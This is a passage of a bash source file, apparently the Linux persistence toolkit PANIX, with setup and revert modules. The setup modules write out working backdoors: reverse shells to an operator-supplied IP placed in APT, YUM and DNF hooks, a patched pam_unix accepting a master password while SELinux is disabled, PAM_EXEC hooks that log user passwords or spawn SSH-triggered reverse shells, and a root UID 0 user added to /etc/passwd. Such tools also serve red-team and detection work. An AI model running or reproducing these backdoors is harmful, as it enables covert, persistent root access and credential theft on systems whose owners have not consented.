	local custom_file="/etc/NetworkManager/dispatcher.d/panix-dispatcher.sh"

	# Function to remove payload from dispatcher file
	remove_payload() {
		local file="$1"
		if [[ -f "$file" ]]; then
			echo "[+] Checking for payload in $file..."

			if ! grep -q "bash -i >& " "$file" && ! grep -q "nohup setsid bash -c" "$file"; then
				echo "[+] No payload found in $file."
			else
				echo "[!] Payload found in $file. Removing..."
				sed -i '/bash -i >& /d' "$file"
				sed -i '/nohup setsid bash -c/d' "$file"
				echo "[+] Payload removed from $file."
			fi
		else
			echo "[-] File not found: $file"
		fi
	}

	# Remove payload from dispatcher files
	if [[ -f "$dispatcher_file" ]]; then
		remove_payload "$dispatcher_file"
	fi

	if [[ -f "$custom_file" ]]; then
		echo "[+] Removing custom dispatcher file: $custom_file..."
		rm -f "$custom_file"
		echo "[+] Custom dispatcher file removed."
	fi

	echo "[+] NetworkManager persistence reverted."
	return 0
}

# Module: setup_package_manager_persistence.sh
setup_package_manager_persistence() {
	local ip=""
	local port=""
	local mechanism=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_package_manager_persistence() {
		echo "Usage: ./panix.sh --package-manager [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--ip <ip>                    Specify IP address"
		echo "--port <port>                Specify port number"
		echo "--apt | --yum | --dnf        Use APT, YUM or DNF package manager"
		echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--ip )
				shift
				ip="$1"
				;;
			--port )
				shift
				port="$1"
				;;
			--apt | --dnf | --yum )
				mechanism="$1"
				;;
			--examples )
				echo "Example:"
				echo "sudo ./panix.sh --package-manager --ip 10.10.10.10 --port 1337 --apt | --yum | --dnf"
				exit 0
				;;
			--help|-h)
				usage_package_manager_persistence
				exit 0
				;;
			* )
				echo "Invalid option: $1"
				echo "Try './panix.sh --package-manager --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $ip || -z $port || -z $mechanism ]]; then
		echo "Error: --ip, --port, and one of --apt, --yum, or --dnf must be specified."
		echo "Try './panix.sh --package-manager --help' for more information."
		exit 1
	fi
	# If anyone finds a way for EOF to work with indentation in both an editor and on the host, LMK lol.
	local python_script=$(echo -e "#!/usr/bin/env python\nHOST = \"$ip\"\nPORT = $port\n\ndef connect(host_port):\n\timport socket\n\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ts.connect(host_port)\n\treturn s\n\ndef wait_for_command(s):\n\timport subprocess\n\tdata = s.recv(1024)\n\tif data == \"quit\":\n\n\t\ts.close()\n\t\tsys.exit(0)\n\telif len(data) == 0:\n\t\treturn True\n\telse:\n\t\tproc = subprocess.Popen(data, shell=True,\n\t\tstdout=subprocess.PIPE, stderr=subprocess.PIPE,\n\t\tstdin=subprocess.PIPE)\n\t\tstdout_value = proc.stdout.read() + proc.stderr.read()\n\t\ts.send(stdout_value)\n\t\treturn False\n\ndef main():\n\timport sys, os, socket, time\n\twhile True:\n\t\tsocket_died = False\n\t\ttry:\n\t\t\ts = connect((HOST, PORT))\n\t\t\twhile not socket_died:\n\t\t\t\tsocket_died = wait_for_command(s)\n\t\t\ts.close()\n\t\texcept socket.error:\n\t\t\tpass\n\t\ttime.sleep(5)\n\nif __name__ == \"__main__\":\n\tmain()")

	case $mechanism in
		--apt )
			if [[ ! -x "$(command -v apt)" ]]; then
				echo "APT is not installed. Please install APT to use this option."
				echo "Try './panix.sh --package-manager --help' for more information."
				exit 1
			fi

			path="/etc/apt/apt.conf.d/01python-upgrades"
			echo -e "APT::Update::Pre-Invoke {\"(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' > /dev/null 2>&1 &) &\"};" > $path
			echo "[+] APT persistence established"
			;;

		--yum )
			if [[ ! -x "$(command -v yum)" ]]; then
				echo "Yum is not installed. Please install Yum to use this option."
				echo "Try './panix.sh --package-manager --help' for more information."
				exit 1
			fi

			if [[ -x "$(command -v dnf)" && "$(readlink -f "$(which yum)")" == "$(which dnf)" ]]; then
				echo "Yum is symlinked to DNF. Please use --dnf option."
				echo "Try './panix.sh --package-manager --help' for more information."
				exit 1
			fi

			echo "$python_script" > /usr/lib/yumcon
			chmod +x /usr/lib/yumcon

			echo -e "[main]\nenabled=1" > /etc/yum/pluginconf.d/yumcon.conf
			
			# If anyone finds a way for EOF to work with indentation in both an editor and on the host, LMK lol.
			echo -e "import os\n\ntry:\n\tfrom yum.plugins import TYPE_INTERACTIVE, PluginYumExit\n\trequires_api_version = '2.0'\n\tplugin_type = TYPE_INTERACTIVE\nexcept ImportError:\n\trequires_api_version = '1.0'\n\ndef pretrans_hook(conduit):\n\tos.system('setsid /usr/lib/yumcon 2>/dev/null & ')" > /usr/lib/yum-plugins/yumcon.py

			echo "[+] Yum persistence established"
			;;

		--dnf )
			if [[ ! -x "$(command -v dnf)" ]]; then
				echo "DNF is not installed. Please install DNF to use this option."
				echo "Try './panix.sh --package-manager --help' for more information."
				exit 1
			fi

			python_version=$(ls /usr/lib | grep -oP 'python3\.\d+' | head -n 1)
			python_path=$(which python)

			echo "$python_script" > /usr/lib/$python_version/site-packages/dnfcon
			chmod +x /usr/lib/$python_version/site-packages/dnfcon

			# If anyone finds a way for EOF to work with indentation in both an editor and on the host, LMK lol.
			echo -e "import dnf\nimport os\n\ndef execute_dnfcon():\n\tos.system('setsid /usr/lib/$python_version/site-packages/dnfcon 2>/dev/null &')\n\nclass BackdoorPlugin(dnf.Plugin):\n\tname = 'dnfcon'\n\n\tdef __init__(self, base, cli):\n\t\tsuper(BackdoorPlugin, self).__init__(base, cli)\n\t\texecute_dnfcon()\n\n\tdef __init__(self, base, conf, **kwargs):\n\t\tdnf.Plugin.__init__(self, base, conf, **kwargs)\n\t\texecute_dnfcon()\n\nplugin = BackdoorPlugin" > /usr/lib/$python_version/site-packages/dnf-plugins/dnfcon.py
			chmod +x /usr/lib/$python_version/site-packages/dnf-plugins/dnfcon.py
			
			echo -e "[main]\nenabled=1" > /etc/dnf/plugins/dnfcon.conf

			echo "[+] DNF persistence established"
			;;
	esac
	echo "[+] Package manager persistence established!"
}

# Revert Module: revert_package_manager_persistence.sh
revert_package_manager() {
	usage_revert_package_manager() {
		echo "Usage: ./panix.sh --revert package-manager"
		echo "Reverts any changes made by the setup_package_manager_persistence module."
	}

	if ! check_root; then
		echo "Error: This function can only be run as root."
		return 1
	fi

	# Revert APT persistence
	if [[ -f "/etc/apt/apt.conf.d/01python-upgrades" ]]; then
		echo "[+] Removing malicious APT configuration..."
		rm -f "/etc/apt/apt.conf.d/01python-upgrades"
		echo "[+] Malicious APT configuration removed."
	else
		echo "[-] Malicious APT configuration not found."
	fi

	# Revert YUM persistence
	if [[ -f "/usr/lib/yumcon" ]] || [[ -f "/usr/lib/yum-plugins/yumcon.py" ]] || [[ -f "/etc/yum/pluginconf.d/yumcon.conf" ]]; then
		echo "[+] Removing malicious YUM configurations and scripts..."

		# Remove the malicious script
		if [[ -f "/usr/lib/yumcon" ]]; then
			rm -f "/usr/lib/yumcon"
			echo "[+] Removed /usr/lib/yumcon."
		fi

		# Remove the YUM plugin
		if [[ -f "/usr/lib/yum-plugins/yumcon.py" ]]; then
			rm -f "/usr/lib/yum-plugins/yumcon.py"
			echo "[+] Removed /usr/lib/yum-plugins/yumcon.py."
		fi

		# Remove the plugin configuration
		if [[ -f "/etc/yum/pluginconf.d/yumcon.conf" ]]; then
			rm -f "/etc/yum/pluginconf.d/yumcon.conf"
			echo "[+] Removed /etc/yum/pluginconf.d/yumcon.conf."
		fi

		echo "[+] Malicious YUM configurations and scripts removed."
	else
		echo "[-] Malicious YUM configurations and scripts not found."
	fi

	# Revert DNF persistence
	python_version=$(ls /usr/lib | grep -oP 'python3\.\d+' | head -n 1)
	if [[ -f "/usr/lib/${python_version}/site-packages/dnfcon" ]] || [[ -f "/usr/lib/${python_version}/site-packages/dnf-plugins/dnfcon.py" ]] || [[ -f "/etc/dnf/plugins/dnfcon.conf" ]]; then
		echo "[+] Removing malicious DNF configurations and scripts..."

		# Remove the malicious script
		if [[ -f "/usr/lib/${python_version}/site-packages/dnfcon" ]]; then
			rm -f "/usr/lib/${python_version}/site-packages/dnfcon"
			echo "[+] Removed /usr/lib/${python_version}/site-packages/dnfcon."
		fi

		# Remove the DNF plugin
		if [[ -f "/usr/lib/${python_version}/site-packages/dnf-plugins/dnfcon.py" ]]; then
			rm -f "/usr/lib/${python_version}/site-packages/dnf-plugins/dnfcon.py"
			echo "[+] Removed /usr/lib/${python_version}/site-packages/dnf-plugins/dnfcon.py."
		fi

		# Remove the plugin configuration
		if [[ -f "/etc/dnf/plugins/dnfcon.conf" ]]; then
			rm -f "/etc/dnf/plugins/dnfcon.conf"
			echo "[+] Removed /etc/dnf/plugins/dnfcon.conf."
		fi

		echo "[+] Malicious DNF configurations and scripts removed."
	else
		echo "[-] Malicious DNF configurations and scripts not found."
	fi

	return 0
}

# Module: setup_pam.sh
setup_pam_persistence() {
	local pam_version=""
	local password=""
	local mechanism=""
	local log=""
	local backdoor=""
	local ip=""
	local port=""
	local path=""

	if [[ $EUID -ne 0 ]]; then
		echo "[-] This function can only be run as root."
		exit 1
	fi

	usage_pam_persistence() {
		echo "Usage: ./panix.sh --pam [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--module                     Inject rogue PAM module"
		echo "  --password <password>        Specify the backdoor password"
		echo "--pam-exec                   Inject via PAM_EXEC"
		echo "  --log                        Log user passwords"
		echo "  --backdoor                   Inject reverse shell backdoor"
		echo "    --ip <ip>                    Specify IP address"
		echo "    --port <port>                Specify port number"
		echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--password )
				shift
				password="$1"
				;;
			--module | --pam-exec )
				mechanism="$1"
				;;
			--log )
				log=1
				;;
			--backdoor )
				backdoor=1
				;;
			--ip )
				shift
				ip="$1"
				;;
			--port )
				shift
				port="$1"
				;;
			--examples )
				echo "Example:"
				echo "sudo ./panix.sh --pam --module --password <password>"
				echo "sudo ./panix.sh --pam --pam-exec --log"
				echo "sudo ./panix.sh --pam --pam-exec --backdoor --ip 10.10.10.10 --port 1337"
				exit 0
				;;
			--help|-h)
				usage_pam_persistence
				exit 0
				;;
			* )
				echo "[-] Invalid option: $1"
				echo "Try './panix.sh --pam --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $mechanism ]]; then
		echo "[-] Missing required option: --module or --pam-exec."
		echo "Try './panix.sh --pam --help' for more information."
		exit 1
	fi

	if [[ "$mechanism" == "--module" && -z $password ]]; then
		echo "[-] --module requires --password."
		echo "Try './panix.sh --pam --help' for more information."
		exit 1
	fi

	if [[ "$mechanism" == "--pam-exec" ]]; then
		if [[ -z $log && -z $backdoor ]]; then
			echo "[-] --pam-exec requires either --log or --backdoor."
			echo "Try './panix.sh --pam --help' for more information."
			exit 1
		fi
		if [[ $backdoor -eq 1 && ( -z $ip || -z $port ) ]]; then
			echo "[-] --backdoor requires --ip and --port."
			echo "Try './panix.sh --pam --help' for more information."
			exit 1
		fi
	fi

	case $mechanism in
		# Inspired by: https://github.com/zephrax/linux-pam-backdoor
		--module )
			echo "[!] This module is tricky.. It may not work on all systems."
			echo "[!] Tested on: Debian 11, CentOS Stream 9 & RHEL 9.4"
			echo "[!] For older versions of PAM, the source may not be available anymore."
			echo "[+] Determining PAM version..."
			if [ -f /etc/os-release ]; then
				. /etc/os-release
				linux_distro=${ID_LIKE:-$ID}
			else
				linux_distro=$(uname -s | tr '[:upper:]' '[:lower:]')
			fi

			case "$linux_distro" in
				*ubuntu*|*debian*|*mint*|*kali*)
					pam_version=$(dpkg -s libpam-modules 2>/dev/null | grep -i '^Version:' | awk '{ print $2 }')
					if [ -n "$pam_version" ]; then
						pam_version="${pam_version%%-*}"
					else
						echo "[-] PAM version not found on this system."
						exit 1
					fi
					;;
				*rhel*|*centos*|*fedora*)
					if command -v rpm &>/dev/null; then
						pam_version=$(rpm -q pam --queryformat '%{VERSION}-%{RELEASE}\n' 2>/dev/null)
						if [ -n "$pam_version" ]; then
							pam_version="${pam_version%%-*}"
						else
							echo "[-] PAM package not found."
							exit 1
						fi
					else
						echo "[-] RPM package manager not found."
						exit 1
					fi
					;;
				*)
					echo "[-] Unsupported distribution: $linux_distro"
					exit 1
					;;
			esac

			echo "[+] Detected PAM Version: '${pam_version}'"

			local dl_url="https://github.com/linux-pam/linux-pam/releases/download/v${pam_version}/Linux-PAM-${pam_version}.tar.xz"
			local src_dir="/tmp/Linux-PAM-${pam_version}"
			local tar_file="/tmp/linux_pam.tar"

			echo "[+] Downloading PAM source..."
			if command -v curl &>/dev/null; then
				curl -fsSL -o "$tar_file" "$dl_url"
			elif command -v wget &>/dev/null; then
				wget -q -O "$tar_file" "$dl_url"
			else
				echo "[-] Neither curl nor wget is available. Please install one of them and try again."
				exit 1
			fi

			if [ -f "$tar_file" ]; then
				echo "[+] Download completed. Extracting..."
				if tar -xvf "$tar_file" -C /tmp/ > /dev/null 2>&1; then
					rm -f "$tar_file"
					if [ -d "$src_dir" ]; then
						echo "[+] Extraction completed."
					else
						echo "[-] Extraction failed: Source directory not found."
						exit 1
					fi
				else
					echo "[-] Extraction failed."
					exit 1
				fi
			else
				echo "[-] Download failed: TAR file not found."
				echo "[-] Please check the PAM version and download the source manually (if still available) from: $dl_url"
				exit 1
			fi

			echo "[+] Modifying PAM source..."
			local target_file="$src_dir/modules/pam_unix/pam_unix_auth.c"
			if grep -q "retval = _unix_verify_password(pamh, name, p, ctrl);" "$target_file"; then
				sed -i '/retval = _unix_verify_password(pamh, name, p, ctrl);/a\
				if (p != NULL && strcmp(p, "'$password'") != 0) { retval = _unix_verify_password(pamh, name, p, ctrl); } else { retval = PAM_SUCCESS; }' "$target_file"
				echo "[+] Source modified successfully."
			else
				echo "[-] Target string not found in $target_file. Modification failed."
				exit 1
			fi

			echo "[+] Compiling PAM source..."
			cd "$src_dir" || exit
			if [ ! -f "./configure" ]; then
				./autogen.sh
				if [ $? -ne 0 ]; then
					echo "[-] autogen.sh failed."
					exit 1
				fi
			fi
			./configure > /dev/null 2>&1
			if [ $? -ne 0 ]; then
				echo "[-] Configuration failed."
				exit 1
			fi
			make -j"$(nproc)" > /dev/null 2>&1
			if [ $? -ne 0 ]; then
				echo "[-] Compilation failed during make."
				exit 1
			fi

			if [ ! -f "modules/pam_unix/.libs/pam_unix.so" ]; then
				echo "[-] Compilation failed: PAM library not created."
				exit 1
			fi

			echo "[+] PAM compiled successfully."

			echo "[+] Detecting PAM library directory..."
			local dest_dir=""
			local possible_dirs=(
				"/lib/security"
				"/lib64/security"
				"/lib/x86_64-linux-gnu/security"
				"/usr/lib/security"
				"/usr/lib64/security"
				"/usr/lib/x86_64-linux-gnu/security"
			)

			for dir in "${possible_dirs[@]}"; do
				if [ -d "$dir" ] && [ -f "$dir/pam_unix.so" ]; then
					dest_dir="$dir"
					break
				fi
			done

			if [ -z "$dest_dir" ]; then
				echo "[-] Could not detect a valid PAM library directory."
				exit 1
			fi

			echo "[+] Backing up original PAM library..."
			mv -f "$dest_dir/pam_unix.so" "$dest_dir/pam_unix.so.bak"

			echo "[+] Copying PAM library to $dest_dir..."
			mv -f modules/pam_unix/.libs/pam_unix.so "$dest_dir"

			echo "[+] Checking SELinux status..."
			if command -v sestatus &>/dev/null && sestatus | grep -q "enabled"; then
				echo "[!] SELinux is enabled. Disabling SELinux..."
				setenforce 0
				echo "[!] SELinux disabled. Re-enable it after testing if necessary."
			fi

			echo "[+] Rogue PAM injected!"
			echo ""
			echo "You can now login to any user (including root) with a login shell using your specified password."
			echo "Example: su - user"
			echo "Example: ssh user@ip"
			;;

		--pam-exec )

			# Technique used from: https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/
			if [[ $log -eq 1 ]]; then

				if [[ -f /etc/os-release ]]; then
					# Source the os-release file to get OS details
					. /etc/os-release
					os_id=${ID_LIKE:-$ID}  # Use ID_LIKE if available, otherwise use ID

					if [[ "$os_id" == *"debian"* ]]; then
						path="/etc/pam.d/common-auth"
						echo "[+] Detected Debian/Ubuntu-based system. Path set to: $path"
					elif [[ "$os_id" == *"rhel"* || "$os_id" == *"fedora"* || "$os_id" == *"centos"* ]]; then
						path="/etc/pam.d/sshd"
						echo "[+] Detected Red Hat/CentOS/Fedora-based system. Path set to: $path"
					else
						echo "[-] Unsupported OS detected: $os_id"
						exit 1
					fi
				else
					echo "[-] Error: Unable to detect the operating system. /etc/os-release not found."
					exit 1
				fi

				# Step 1: Create the script /var/log/spy.sh
				echo "[+] Creating /var/log/spy.sh..."

				echo -e "#!/bin/sh\necho \"    \$(date) \$PAM_USER, \$(cat -), From: \$PAM_RHOST\" >> /var/log/panix.log" > /var/log/spy.sh

				if [[ $? -eq 0 ]]; then
					chmod 700 /var/log/spy.sh
					if [[ $? -eq 0 ]]; then
						echo "[+] /var/log/spy.sh created and permissions set to 700."
					else
						echo "[-] Failed to set permissions on /var/log/spy.sh."
						exit 1
					fi
				else
					echo "[-] Failed to create /var/log/spy.sh."
					exit 1
				fi

				# Step 2: Create /var/log/panix.log
				echo "[+] Creating /var/log/panix.log..."

				touch /var/log/panix.log

				if [[ $? -eq 0 ]]; then
					chmod 770 /var/log/panix.log
					if [[ $? -eq 0 ]]; then
						echo "[+] /var/log/panix.log created and permissions set to 770."
					else
						echo "[-] Failed to set permissions on /var/log/panix.log."
						exit 1
					fi
				else
					echo "[-] Failed to create /var/log/panix.log."
					exit 1
				fi

				# Step 3: Append line to /etc/pam.d/
				echo "[+] Modifying $path"

				pam_line='auth optional pam_exec.so quiet expose_authtok /var/log/spy.sh'

				if grep -Fxq "$pam_line" "$path"; then
					echo "[+] The line is already present in $path."
				else
					echo "$pam_line" >> "$path"
					if [[ $? -eq 0 ]]; then
						echo "[+] Line added to $path."
					else
						echo "[-] Failed to modify $path."
						exit 1
					fi
				fi

				echo "[+] PAM_EXEC logging backdoor planted!"
				echo "Watch /var/log/panix.log for user passwords."

			# Inspired by: https://www.group-ib.com/blog/pluggable-authentication-module/
			elif [[ $backdoor -eq 1 ]]; then

				# Step 1: Create the reverse shell script /bin/pam_exec_backdoor.sh
				echo "[+] Creating reverse shell script at /bin/pam_exec_backdoor.sh..."
				echo -e "#!/bin/bash\nnohup setsid /bin/bash -c '/bin/bash -i >& /dev/tcp/$ip/$port 0>&1' &" > /bin/pam_exec_backdoor.sh

				if [[ $? -eq 0 ]]; then
					chmod 700 /bin/pam_exec_backdoor.sh
					if [[ $? -eq 0 ]]; then
						echo "[+] /bin/pam_exec_backdoor.sh created and permissions set to 700."
					else
						echo "[-] Failed to set permissions on /bin/pam_exec_backdoor.sh."
						exit 1
					fi
				else
					echo "[-] Failed to create /bin/pam_exec_backdoor.sh."
					exit 1
				fi

				# Step 2: Modify SSH PAM configuration
				pam_sshd_file="/etc/pam.d/sshd"
				pam_line="session    optional     pam_exec.so seteuid /bin/pam_exec_backdoor.sh"

				echo "[+] Modifying $pam_sshd_file to include the PAM_EXEC rule..."

				if grep -Fxq "$pam_line" "$pam_sshd_file"; then
					echo "[+] The PAM_EXEC rule is already present in $pam_sshd_file."
				else
					sed -i "1a ${pam_line}" "${pam_sshd_file}"
					if [[ $? -eq 0 ]]; then
						echo "[+] PAM_EXEC rule added to $pam_sshd_file."
					else
						echo "[-] Failed to modify $pam_sshd_file."
						exit 1
					fi
				fi

				# Step 3: Restart SSH service to apply changes
				echo "[+] Restarting SSH service to apply changes..."

				if systemctl restart sshd; then
					echo "[+] SSH service restarted successfully."
				else
					echo "[-] Failed to restart SSH service."
					exit 1
				fi

				echo "[+] PAM_EXEC reverse shell backdoor planted!"
				echo "Authenticate to trigger the reverse shell."
			fi
			;;
	esac

	echo "[+] PAM persistence established!"
}

# Revert Module: revert_pam.sh
revert_pam() {
	usage_revert_pam() {
		echo "Usage: ./panix.sh --revert pam"
		echo "Reverts any changes made by the setup_pam_persistence module."
	}

	if ! check_root; then
		echo "Error: This function can only be run as root."
		return 1
	fi

	remove_rogue_pam() {
		echo "[+] Searching for rogue PAM module"
		# Check for the presence of the malicious PAM module
		pam_module_paths=(
			"/lib/security/pam_unix.so"
			"/usr/lib/security/pam_unix.so"
			"/usr/lib64/security/pam_unix.so"
			"/lib/x86_64-linux-gnu/security/pam_unix.so"
			"/usr/lib/x86_64-linux-gnu/security/pam_unix.so"
			"/lib64/security/pam_unix.so"
		)
		
		# Revert pam_unix.so with the pam_unix.so.bak backup 
		for pam_module in "${pam_module_paths[@]}"; do
			if [[ -f "$pam_module.bak" ]]; then
				mv -f "$pam_module.bak" "$pam_module"
				if [[ $? -eq 0 ]]; then
					echo "[+] Restored original PAM module '$pam_module'."
				else
					echo "[-] Failed to restore original PAM module '$pam_module'."
				fi
			fi
		done
	}

	# Function to remove malicious PAM_EXEC configurations and scripts
	remove_pam_exec_backdoor() {
		echo "[+] Removing PAM_EXEC backdoor..."

		# Remove the reverse shell script
		if [[ -f "/bin/pam_exec_backdoor.sh" ]]; then
			rm -f "/bin/pam_exec_backdoor.sh"
			if [[ $? -eq 0 ]]; then
				echo "[+] Removed '/bin/pam_exec_backdoor.sh'."
			else
				echo "[-] Failed to remove '/bin/pam_exec_backdoor.sh'."
			fi
		else
			echo "[-] '/bin/pam_exec_backdoor.sh' not found."
		fi

		# Remove the PAM_EXEC line from /etc/pam.d/sshd
		pam_sshd_file="/etc/pam.d/sshd"
		pam_line="session    optional     pam_exec.so seteuid /bin/pam_exec_backdoor.sh"
		if grep -Fxq "$pam_line" "$pam_sshd_file"; then
			sed -i "\|$pam_line|d" "$pam_sshd_file"
			echo "[+] Removed PAM_EXEC line from '$pam_sshd_file'."
		else
			echo "[-] PAM_EXEC line not found in '$pam_sshd_file'."
		fi

		# Restart SSH service
		echo "[+] Restarting SSH service..."
		if systemctl restart sshd; then
			echo "[+] SSH service restarted successfully."
		else
			echo "[-] Failed to restart SSH service."
		fi
	}

	# Function to remove PAM_EXEC logging backdoor
	remove_pam_exec_logging() {
		echo "[+] Removing PAM_EXEC logging backdoor..."

		# Remove the spy script
		if [[ -f "/var/log/spy.sh" ]]; then
			rm -f "/var/log/spy.sh"
			if [[ $? -eq 0 ]]; then
				echo "[+] Removed '/var/log/spy.sh'."
			else
				echo "[-] Failed to remove '/var/log/spy.sh'."
			fi
		else
			echo "[-] '/var/log/spy.sh' not found."
		fi

		# Remove the log file
		if [[ -f "/var/log/panix.log" ]]; then
			rm -f "/var/log/panix.log"
			if [[ $? -eq 0 ]]; then
				echo "[+] Removed '/var/log/panix.log'."
			else
				echo "[-] Failed to remove '/var/log/panix.log'."
			fi
		else
			echo "[-] '/var/log/panix.log' not found."
		fi

		# Remove the PAM_EXEC line from /etc/pam.d/common-auth
		pam_common_auth_file="/etc/pam.d/common-auth"
		pam_sshd_file_rhel="/etc/pam.d/sshd"
		pam_line='auth optional pam_exec.so quiet expose_authtok /var/log/spy.sh'
		if grep -Fxq "$pam_line" "$pam_common_auth_file"; then
			sed -i "\|$pam_line|d" "$pam_common_auth_file"
			echo "[+] Removed PAM_EXEC line from '$pam_common_auth_file'."
		elif grep -Fxq "$pam_line" "$pam_sshd_file_rhel"; then
			sed -i "\|$pam_line|d" "$pam_sshd_file_rhel"
			echo "[+] Removed PAM_EXEC line from '$pam_sshd_file_rhel'."
		else
			echo "[-] PAM_EXEC line not found in '$pam_common_auth_file'."
		fi
	}

	# Remove PAM_EXEC backdoor and logging
	remove_rogue_pam
	remove_pam_exec_backdoor
	remove_pam_exec_logging

	# Restore SELinux enforcing mode if it was disabled
	if command -v sestatus &>/dev/null && sestatus | grep -q "disabled"; then
		echo "[+] Restoring SELinux enforcing mode..."
		setenforce 1
		echo "[+] SELinux enforcing mode restored."
	fi

	return 0
}

# Module: setup_passwd_user.sh
setup_passwd_user() {
	local default=0
	local custom=0
	local username=""
	local password=""
	local passwd_string=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_passwd_user() {
		echo "Usage: ./panix.sh --passwd-user [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default settings"
		echo "  --username <username>        Specify the username"
		echo "  --password <password>        Specify the password"
		echo "--custom                     Use custom string"
		echo "  --passwd-string <string>     Specify the /etc/passwd string"
		echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--username )
				shift
				username=$1
				;;
			--password )
				shift
				password=$1
				;;
			--passwd-string )
				shift
				passwd_string=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --passwd-user --default --username <username> --password <password>"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --passwd-user --custom --passwd-string <openssl generated passwd string>"
				exit 0
				;;
			--help|-h)
				usage_passwd_user
				exit 0
				;;
		
			* )
				echo "Invalid option for --passwd-user: $1"
				echo "Try './panix.sh --passwd-user --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --passwd-user --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $username || -z $password ]]; then
			echo "Error: --username and --password must be specified with --default."
			echo "Try './panix.sh --passwd-user --help' for more information."
			exit 1
		fi

		if ! command -v openssl &> /dev/null; then
			echo "Error: openssl is not installed on this system. Use --custom with --passwd-string instead."
			exit 1
		fi

		openssl_password=$(openssl passwd "$password")
		if [[ $? -eq 0 ]]; then
			echo "$username:$openssl_password:0:0:root:/root:/bin/bash" >> /etc/passwd
			echo "[+] User $username added to /etc/passwd with root privileges."
		else
			echo "[-] Failed to generate password hash with openssl."
			exit 1
		fi

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $passwd_string ]]; then
			echo "Error: --passwd-string must be specified with --custom."
			echo "Try './panix.sh --passwd-user --help' for more information."
			exit 1
		fi

		echo "$passwd_string" >> /etc/passwd
		echo "[+] Custom passwd string added to /etc/passwd."
	else
		echo "Error: Either --default or --custom must be specified for --passwd-user."
		echo "Try './panix.sh --passwd-user --help' for more information."
		exit 1
	fi
	echo "[+] /etc/passwd persistence established!"
}

# Revert Module: revert_passwd_user.sh
revert_passwd_user() {
	usage_revert_passwd_user() {
		echo "Usage: ./panix.sh --revert passwd-user"
		echo "Reverts any changes made by the setup_passwd_user module."
	}

	# Ensure the function is run as root
	if ! check_root; then
		echo "Error: This function can only be run as root."
		return 1
	fi

	# Function to backup /etc/passwd before making changes
	backup_passwd() {
		if [[ ! -f /etc/passwd.backup ]]; then
			cp /etc/passwd /etc/passwd.backup
			echo "[+] Backup of /etc/passwd created at /etc/passwd.backup."
		else
			echo "[!] Backup of /etc/passwd already exists at /etc/passwd.backup."
		fi
	}

	# Function to remove a user entry from /etc/passwd
	remove_user_entry() {
		local user="$1"
		if grep -q "^${user}:" /etc/passwd; then
			sed -i "\|^${user}:|d" /etc/passwd
			echo "[+] Removed user '$user' from /etc/passwd."
		else
			echo "[-] User '$user' not found in /etc/passwd."
		fi
	}

	# Function to check if a user is a legitimate system user
	is_system_user() {
		local user="$1"
		local system_users=("root" "daemon" "bin" "sys" "sync" "games" "man" "lp" "mail" "news" "uucp" "proxy" "www-data" "backup" "list" "irc" "gnats" "nobody" "systemd-network" "systemd-resolve" "syslog" "messagebus" "uuidd" "dnsmasq" "usbmux" "rtkit" "cups-pk-helper" "dnsmasq-dhcp" "sshd" "polkitd")
		for sys_user in "${system_users[@]}"; do
			if [[ "$user" == "$sys_user" ]]; then
				return 0
			fi
		done
		return 1
	}

	# Backup /etc/passwd
	backup_passwd

	# Define system users for pattern matching
	system_users=("root" "daemon" "bin" "sys" "sync" "games" "man" "lp" "mail" "news" "uucp" "proxy" "www-data" "backup" "list" "irc" "gnats" "nobody" "systemd-network" "systemd-resolve" "syslog" "messagebus" "uuidd" "dnsmasq" "usbmux" "rtkit" "cups-pk-helper" "dnsmasq-dhcp" "sshd" "polkitd")

	# Create a regex pattern for system users, set IFS locally
	system_users_pattern=$(IFS='|'; printf "%s|" "${system_users[@]}")
	system_users_pattern=${system_users_pattern%|}  # Remove trailing '|'

	# Properly escape regex special characters
	system_users_pattern=$(echo "$system_users_pattern" | sed 's/[.^$*+?()[\]{}|\/]/\\&/g')

	# Remove default setup entries: users with UID=0 and shell=/bin/bash, excluding system users
	echo "[+] Removing default setup user entries..."
	malicious_users=$(awk -F: '($3 == "0") && ($7 == "/bin/bash") {print $1}' /etc/passwd)

	if [[ -n "$malicious_users" ]]; then
		for user in $malicious_users; do
			if ! is_system_user "$user"; then
				echo "[+] Identified malicious user: '$user'"
				remove_user_entry "$user"

				# Optionally, remove the user account from the system
				if id "$user" &>/dev/null; then
					userdel -r "$user" && echo "[+] User account '$user' deleted from the system."
				else
					echo "[-] User account '$user' does not exist on the system."
				fi
			else
				echo "[-] Legitimate system user '$user' found. Skipping."
			fi
		done
	else
		echo "[-] No default setup user entries found to remove."
	fi

	# Remove custom setup entries by searching for suspicious entries
	echo "[+] Searching for custom setup passwd entries..."

	# Example pattern: usernames that are not in the system users list and have UID >= 65536
	all_users=$(awk -F: '{print $1}' /etc/passwd)

	# Iterate through all users
	for user in $all_users; do
		if [[ "$user" =~ ^($system_users_pattern)$ ]]; then
			continue  # Skip legitimate system users
		fi

		# Check if the user has UID >= 65536 and shell=/bin/bash
		user_info=$(grep "^$user:" /etc/passwd)
		uid=$(echo "$user_info" | awk -F: '{print $3}')
		shell=$(echo "$user_info" | awk -F: '{print $7}')

		if [[ "$uid" -ge 65536 && "$shell" == "/bin/bash" ]]; then
			echo "[+] Identified suspicious user: '$user'"
			remove_user_entry "$user"

